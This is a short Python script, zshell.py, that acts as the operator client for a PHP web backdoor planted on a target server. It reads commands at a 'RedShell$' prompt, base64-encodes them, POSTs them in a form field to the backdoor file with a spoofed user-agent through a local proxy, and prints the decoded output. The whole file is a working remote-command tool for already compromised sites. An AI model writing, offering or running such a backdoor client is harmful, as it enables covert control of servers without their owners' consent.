#!/usr/bin/python
 
import sys, requests, base64

if len(sys.argv) <= 1:
    print "zshell.py taget/files/file.php"
    exit() 
target = sys.argv[1]
print "[*]Connecting to Backdoor..."
 
while True:
    zshell = raw_input("RedShell$ ")
    enc = base64.b64encode(zshell)
    headers = {'user-agent':'Mozilla/4.0'}
    proxy = {'http':'http://127.0.0.1:8080'}
    data = {'z':enc}
    r=requests.post(target, headers=headers, proxies=proxy, data=data)
    print base64.b64decode(r.text)
